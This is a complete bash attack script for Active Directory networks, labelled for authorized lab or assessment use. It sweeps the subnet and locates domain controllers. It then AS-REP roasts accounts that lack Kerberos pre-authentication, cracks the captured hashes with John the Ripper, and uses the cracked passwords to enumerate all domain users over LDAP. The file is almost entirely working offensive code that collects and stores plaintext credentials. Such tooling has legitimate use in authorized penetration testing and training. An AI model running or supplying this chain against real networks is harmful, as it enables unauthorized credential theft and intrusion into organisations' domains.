#!/bin/bash
# ad_pentest_full.sh - Full AD recon + AS-REP roast + user enumeration
# For authorized lab/assessment use only.

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

# ---------- Output files ----------
HASH_FILE="all_hashes.txt"
IPS_FILE="all_ad_ips.txt"
CREDS_FILE="cracked_creds.txt"
USERS_FILE="all_domain_users.txt"
USERNAMES_FILE="usernames.txt"
PASSWORDS_FILE="passwords.txt"
USERS_FOUND_FILE="users_found.txt"          # <-- NEW
RAW_DIR="nxc_raw_output"

mkdir -p "$RAW_DIR"
: > "$USERS_FILE"
: > "$HASH_FILE"
: > "$CREDS_FILE"
: > "$USERNAMES_FILE"
: > "$PASSWORDS_FILE"
: > "$USERS_FOUND_FILE"                     # <-- NEW

# =========================================================
# STEP 1 : ifconfig + interface selection
# =========================================================
echo -e "\n${BLUE}[STEP 1] ifconfig (Docker interfaces hidden)${NC}"
ifconfig -a | grep -v -E '^(docker|br-|veth|virbr)'

IFACES=$(ifconfig | awk '/^[a-zA-Z0-9]+:/{iface=$1} /inet /{print iface}' \
         | sed 's/://' \
         | grep -v -E '^(docker|br-|veth|virbr|lo)' \
         | sort -u)

IFACE_COUNT=$(echo "$IFACES" | grep -c .)

if [ "$IFACE_COUNT" -gt 1 ]; then
    echo -e "\n${YELLOW}[?] Multiple interfaces detected:${NC}"
    i=1
    for iface in $IFACES; do
        IP=$(ifconfig "$iface" | grep -Eo 'inet ([0-9]*\.){3}[0-9]*' | awk '{print $2}' | head -n1)
        if [ -n "$IP" ]; then
            case "$IP" in
                172.1[7-9].*|172.2[0-9].*|172.3[01].*) continue ;;
            esac
            echo "  $i) $iface  ->  $IP"
            eval "IFACE_$i=$iface"
            i=$((i+1))
        fi
    done
    read -p "Select interface number: " IFACE_NUM
    eval "SELECTED_IFACE=\$IFACE_$IFACE_NUM"
else
    SELECTED_IFACE=$(echo "$IFACES" | head -n1)
fi

KALI_IP=$(ifconfig "$SELECTED_IFACE" | grep -Eo 'inet ([0-9]*\.){3}[0-9]*' | awk '{print $2}' | head -n1)
[ -z "$KALI_IP" ] && read -p "Enter Kali IP manually: " KALI_IP
SUBNET=$(echo "$KALI_IP" | cut -d. -f1-3).0/24
echo -e "${GREEN}[+] Kali: $SELECTED_IFACE ($KALI_IP)   Subnet: $SUBNET${NC}"

# =========================================================
# STEP 2 : fping sweep
# =========================================================
echo -e "\n${BLUE}[STEP 2] fping -a -g $SUBNET${NC}"
fping -a -g "$SUBNET" 2>/dev/null \
  | grep -v -E '^172\.(1[7-9]|2[0-9]|3[01])\.' \
  | sort -u \
  | tee live_hosts.txt
echo -e "${GREEN}[+] Live hosts: $(wc -l < live_hosts.txt)${NC}"

# =========================================================
# STEP 3 : nmap 389,88,445 -> find DCs
# =========================================================
echo -e "\n${BLUE}[STEP 3] nmap -p 389,88,445 on all live hosts${NC}"
> ad_servers.txt
> dc_ips.txt
> possible_dc_ips.txt

echo -e "${CYAN}  IP               389   88    445   DC?${NC}"
echo -e "${CYAN}  --------------------------------------------${NC}"

while read -r ip; do
    [ -z "$ip" ] && continue
    case "$ip" in
        172.1[7-9].*|172.2[0-9].*|172.3[01].*) continue ;;
    esac

    OUT=$(nmap -p 389,88,445 --open -Pn "$ip" 2>/dev/null)
    L=$(echo "$OUT" | grep -q "389/tcp.*open" && echo "YES" || echo " - ")
    K=$(echo "$OUT" | grep -q "88/tcp.*open"   && echo "YES" || echo " - ")
    S=$(echo "$OUT" | grep -q "445/tcp.*open"  && echo "YES" || echo " - ")

    OPEN_COUNT=0
    [ "$L" = "YES" ] && OPEN_COUNT=$((OPEN_COUNT+1))
    [ "$K" = "YES" ] && OPEN_COUNT=$((OPEN_COUNT+1))
    [ "$S" = "YES" ] && OPEN_COUNT=$((OPEN_COUNT+1))

    if [ "$OPEN_COUNT" -eq 3 ]; then
        DC="YES"; echo "$ip" >> dc_ips.txt; echo "$ip" >> ad_servers.txt
    elif [ "$OPEN_COUNT" -eq 2 ]; then
        DC="maybe"; echo "$ip" >> possible_dc_ips.txt; echo "$ip" >> ad_servers.txt
    elif [ "$OPEN_COUNT" -eq 1 ]; then
        DC=" - "; echo "$ip" >> ad_servers.txt
    else
        continue
    fi
    printf "  %-16s %-5s %-5s %-5s %-5s\n" "$ip" "$L" "$K" "$S" "$DC"
done < live_hosts.txt

if [ -s dc_ips.txt ]; then
    echo -e "${GREEN}[+] Confirmed DCs:${NC}"
    while read -r ip; do echo -e "    ${GREEN}$ip${NC}"; done < dc_ips.txt
fi
if [ -s possible_dc_ips.txt ]; then
    echo -e "${YELLOW}[*] Possible DCs:${NC}"
    while read -r ip; do echo -e "    ${YELLOW}$ip${NC}"; done < possible_dc_ips.txt
fi

if [ ! -s ad_servers.txt ]; then
    echo -e "${RED}[!] No AD-capable host found.${NC}"
    read -p "  Enter DC IP manually: " MANUAL_IP
    echo "$MANUAL_IP" > ad_servers.txt
    echo "$MANUAL_IP" > dc_ips.txt
fi

cat dc_ips.txt possible_dc_ips.txt 2>/dev/null | sort -u > "$IPS_FILE"
[ ! -s "$IPS_FILE" ] && cp ad_servers.txt "$IPS_FILE"
echo -e "${GREEN}[+] Candidate AD servers: $(wc -l < "$IPS_FILE")${NC}"
cat "$IPS_FILE"

# =========================================================
# STEP 4 : Userlist for AS-REP
# =========================================================
echo -e "\n${BLUE}[STEP 4] Userlist for AS-REP enumeration${NC}"
read -p "  Enter path to userlist (or 'new' to enter manually): " UL_IN

if [ "$UL_IN" = "new" ] || [ ! -f "$UL_IN" ]; then
    echo -e "${YELLOW}[*] Enter usernames, one per line. Blank line to finish:${NC}"
    > userlist.txt
    while IFS= read -r line; do
        [ -z "$line" ] && break
        echo "$line" >> userlist.txt
    done
else
    cp "$UL_IN" userlist.txt
fi
echo -e "${GREEN}[+] Userlist: $(pwd)/userlist.txt ($(wc -l < userlist.txt) users)${NC}"

# =========================================================
# STEP 5 : Loop ALL DCs -> GetNPUsers (DONT_REQUIRE_PREAUTH)
# =========================================================
echo -e "\n${BLUE}[STEP 5] AS-REP roasting across all AD servers${NC}"
> all_dc_results.txt
DC_INDEX=0

while read -r DC_IP; do
    [ -z "$DC_IP" ] && continue
    DC_INDEX=$((DC_INDEX+1))
    echo -e "\n${CYAN}===== DC #$DC_INDEX : $DC_IP =====${NC}"

    DOMAIN=$(nxc ldap "$DC_IP" -u '' -p '' 2>/dev/null \
             | grep -Eo '\(domain:[^)]+\)' | head -n1 | cut -d: -f2 | tr -d ')')
    [ -z "$DOMAIN" ] && DOMAIN=$(nmap -p 389 --script=ldap-rootdse "$DC_IP" 2>/dev/null \
             | grep -i 'ldapServiceName' | awk '{print $2}' | cut -d: -f1)
    [ -z "$DOMAIN" ] && DOMAIN=$(dig +short -x "$DC_IP" 2>/dev/null \
             | sed 's/\.$//' | cut -d. -f2- | head -n1)

    if [ -z "$DOMAIN" ]; then
        echo -e "${YELLOW}[-] Could not detect domain for $DC_IP — skipping${NC}"
        continue
    fi
    echo -e "${GREEN}[+] Domain: $DOMAIN${NC}"

    TMP_HASH="/tmp/asrep_${DC_IP}.txt"
    > "$TMP_HASH"

    impacket-GetNPUsers "$DOMAIN/" -no-pass \
        -usersfile userlist.txt \
        -format john \
        -outputfile "$TMP_HASH" \
        -dc-ip "$DC_IP" >/dev/null 2>&1

    HITS=$(grep -c '\$krb5asrep\$' "$TMP_HASH" 2>/dev/null || echo 0)
    if [ "$HITS" -gt 0 ]; then
        echo -e "${GREEN}[+] DONT_REQUIRE_PREAUTH accounts: $HITS${NC}"
        grep '\$krb5asrep\$' "$TMP_HASH" | tee -a "$HASH_FILE"
        { echo "===== DC: $DC_IP | DOMAIN: $DOMAIN ====="
          grep '\$krb5asrep\$' "$TMP_HASH"; echo ""; } >> all_dc_results.txt
    else
        echo -e "${YELLOW}[-] No DONT_REQUIRE_PREAUTH accounts on $DC_IP${NC}"
    fi
done < "$IPS_FILE"

echo -e "\n${GREEN}[+] Total AS-REP hashes collected: $(grep -c '\$krb5asrep\$' "$HASH_FILE" 2>/dev/null || echo 0)${NC}"

# =========================================================
# STEP 6 : John the Ripper + write deduplicated creds
# =========================================================
if [ ! -s "$HASH_FILE" ]; then
    echo -e "\n${RED}[!] No AS-REP hashes collected. Cannot crack.${NC}"
else
    echo -e "\n${BLUE}[STEP 6] John the Ripper${NC}"
    echo "  1) /usr/share/wordlists/rockyou.txt"
    echo "  2) Custom wordlist"
    read -p "Choose (1/2): " WL_CHOICE

    if [ "$WL_CHOICE" = "1" ]; then
        WORDLIST="/usr/share/wordlists/rockyou.txt"
    else
        read -p "  Full path to wordlist: " WORDLIST
        [ ! -f "$WORDLIST" ] && { echo -e "${RED}[!] Not found, using rockyou.txt${NC}"; WORDLIST="/usr/share/wordlists/rockyou.txt"; }
    fi
    echo -e "${GREEN}[+] Wordlist: $WORDLIST${NC}"

    john --wordlist="$WORDLIST" "$HASH_FILE"

    echo -e "\n${GREEN}[+] Cracked credentials:${NC}"
    john --show --format=krb5asrep "$HASH_FILE"

    echo -e "\n${CYAN}[*] Writing deduplicated credentials...${NC}"
    : > "$CREDS_FILE"

    while IFS= read -r line; do
        USER=$(echo "$line" | sed -E 's/.*\$([^$]+)@.*/\1/')
        PASS=$(echo "$line" | sed -E 's/^[^:]+:(.*)$/\1/')
        if [ -n "$USER" ] && [ -n "$PASS" ]; then
            echo "${USER}:${PASS}" >> "$CREDS_FILE"
        fi
    done < <(john --show --format=krb5asrep "$HASH_FILE" 2>/dev/null | grep '\$krb5asrep\$')

    sort -u "$CREDS_FILE" -o "$CREDS_FILE"
    cut -d: -f1 "$CREDS_FILE" | sort -u > "$USERNAMES_FILE"
    cut -d: -f2 "$CREDS_FILE" | sort -u > "$PASSWORDS_FILE"

    CRACKED_COUNT=$(wc -l < "$CREDS_FILE")
    echo -e "${GREEN}[+] Deduplicated cred pairs: $CRACKED_COUNT${NC}"
    echo -e "${CYAN}[*] $CREDS_FILE:${NC}";    cat "$CREDS_FILE"
    echo -e "${CYAN}[*] $USERNAMES_FILE:${NC}"; cat "$USERNAMES_FILE"
    echo -e "${CYAN}[*] $PASSWORDS_FILE:${NC}"; cat "$PASSWORDS_FILE"
fi

# =========================================================
# STEP 7 : User enumeration via nxc ldap --users on ALL DCs
# =========================================================
if [ ! -s "$CREDS_FILE" ]; then
    echo -e "\n${RED}[!] No deduplicated credentials — skipping user enumeration.${NC}"
else
    echo -e "\n${BLUE}[STEP 7] LDAP user enumeration on ALL DCs${NC}"

    while IFS=: read -r USER PASS; do
        [ -z "$USER" ] && continue
        [ -z "$PASS" ] && continue

        echo -e "\n${CYAN}=================================================${NC}"
        echo -e "${CYAN}[*] Credential: ${GREEN}${USER}${CYAN} : ${GREEN}${PASS}${NC}"
        echo -e "${CYAN}=================================================${NC}"

        while read -r DC_IP; do
            [ -z "$DC_IP" ] && continue

            SAFE_IP=$(echo "$DC_IP" | tr '/\\:*?"<>|' '_')
            SAFE_USER=$(echo "$USER" | tr '/\\:*?"<>|' '_')
            LOG_FILE="${RAW_DIR}/log_${SAFE_IP}_${SAFE_USER}.txt"
            EXPORT_FILE="${RAW_DIR}/users_export_${SAFE_IP}_${SAFE_USER}.txt"

            echo -e "${YELLOW}[*] nxc ldap $DC_IP -u '$USER' -p '***' --users${NC}"

            nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --users 2>&1 | tee "$LOG_FILE"

            grep -oE '[A-Za-z0-9_.-]+\\[A-Za-z0-9_.$-]+' "$LOG_FILE" \
                | sed 's/.*\\//' \
                | grep -vE '^$' \
                >> "$USERS_FILE"

            nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --users-export "$EXPORT_FILE" \
                >/dev/null 2>&1

            if [ -s "$EXPORT_FILE" ]; then
                sed -E 's/^[^\\]*\\//' "$EXPORT_FILE" \
                    | awk -F: '{print $1}' \
                    | grep -E '^[A-Za-z0-9_.-]+$' \
                    >> "$USERS_FILE"
                echo -e "${GREEN}    [+] --users-export added: $(wc -l < "$EXPORT_FILE") lines${NC}"
            fi

            sleep 1
        done < "$IPS_FILE"
    done < "$CREDS_FILE"

    if [ -s "$USERS_FILE" ]; then
        sort -u "$USERS_FILE" -o "$USERS_FILE"
    fi
fi

# =========================================================
# STEP 8 : Summary + SAVE users to users_found.txt
# =========================================================
echo -e "\n${GREEN}=================================================${NC}"
echo -e "${GREEN}  COMPLETE${NC}"
echo -e "${GREEN}=================================================${NC}"
echo -e "${GREEN}  AD servers scanned : $DC_INDEX${NC}"
echo -e "${GREEN}  AS-REP hashes      : $(grep -c '\$krb5asrep\$' "$HASH_FILE" 2>/dev/null || echo 0)${NC}"
echo -e "${GREEN}  Cracked cred pairs : $(wc -l < "$CREDS_FILE" 2>/dev/null || echo 0)${NC}"
echo -e "${GREEN}  Users enumerated   : $(wc -l < "$USERS_FILE" 2>/dev/null || echo 0)${NC}"
echo -e "${GREEN}  Hashes file        : $(pwd)/$HASH_FILE${NC}"
echo -e "${GREEN}  Cracked creds file : $(pwd)/$CREDS_FILE${NC}"
echo -e "${GREEN}  Usernames file     : $(pwd)/$USERNAMES_FILE${NC}"
echo -e "${GREEN}  Passwords file     : $(pwd)/$PASSWORDS_FILE${NC}"
echo -e "${GREEN}  Domain users file  : $(pwd)/$USERS_FILE${NC}"
echo -e "${GREEN}  Users found file   : $(pwd)/$USERS_FOUND_FILE${NC}"
echo -e "${GREEN}  Raw nxc logs       : $(pwd)/$RAW_DIR/${NC}"
echo -e "${BLUE}================================================${NC}"

# ---- Save users found to dedicated file ----
if [ -s "$USERS_FILE" ]; then
    sort -u "$USERS_FILE" -o "$USERS_FILE"

    {
        echo "# Users found - $(date '+%Y-%m-%d %H:%M:%S')"
        echo "# Total: $(wc -l < "$USERS_FILE")"
        echo "# ----------------------------------------"
        cat "$USERS_FILE"
    } > "$USERS_FOUND_FILE"

    echo -e "\n${GREEN}[+] Users saved to: $(pwd)/$USERS_FOUND_FILE${NC}"
    echo -e "${GREEN}[+] Total unique users: $(wc -l < "$USERS_FILE")${NC}"

    echo -e "\n${CYAN}Users found:${NC}"
    cat "$USERS_FILE"
else
    echo -e "\n${YELLOW}[!] No users found. $USERS_FOUND_FILE not created.${NC}"
fi
